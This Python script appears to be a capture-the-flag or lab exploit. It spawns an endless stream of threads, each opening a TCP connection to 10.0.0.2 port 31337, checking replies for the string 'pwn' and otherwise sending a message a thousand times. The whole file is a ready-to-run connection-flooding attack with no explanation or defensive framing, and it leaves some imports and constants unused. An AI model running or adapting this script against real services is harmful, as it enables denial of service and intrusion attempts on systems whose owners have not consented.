import socket
import subprocess
import sys
import threading
import time

HOST = "10.0.0.2"
PORT = 31337
TH_NUM = 100000
SLEEP_TIME = 0.1

def make_connection(num):
    try:
        sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockfd.connect((HOST, PORT))
        print(f"{num}")

        while (True):
            data = sockfd.recv(1024) or b""
            if len(data) and data !=  b"":
                print(data) 
                if b"pwn" in data:
                    sys.exit(0)
                break
        
        msg = "hello " + str(num)
        for i in range(1000):
            sockfd.sendall(msg.encode())

    except KeyboardInterrupt:
        print("quit")
        sys.exit(1)

    except Exception as e:
        pass

def main():
    num = 0
    while True:
        num += 1
        try:
            thread = threading.Thread(target=make_connection, args=(num,))
            thread.start()
        except KeyboardInterrupt:
            print("quit")
            sys.exit(1)
        
        except Exception:
            pass

    return (0)

if __name__ == "__main__":
    main()